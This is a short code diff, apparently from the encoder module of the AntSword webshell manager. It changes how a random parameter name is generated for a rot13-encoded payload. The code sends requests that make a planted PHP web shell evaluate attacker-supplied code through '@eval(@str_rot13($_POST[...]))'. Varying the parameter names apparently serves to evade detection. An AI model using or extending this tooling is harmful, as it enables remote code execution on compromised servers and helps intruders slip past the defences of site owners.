@@ -20,10 +20,12 @@ module.exports = (pwd, data, ext = null) => {
   }
 
   // 生成一个随机变量名
-  let randomID = `_0x${Math
-    .random()
-    .toString(16)
-    .substr(2)}`;
+  let randomID;
+  if (ext.opts.otherConf['use-random-variable'] === 1) {
+    randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
+  } else {
+    randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
+  }
   data[randomID] = encode(data['_']);
   data[pwd] = `@eval(@str_rot13($_POST[${randomID}]));`;
   delete data['_'];
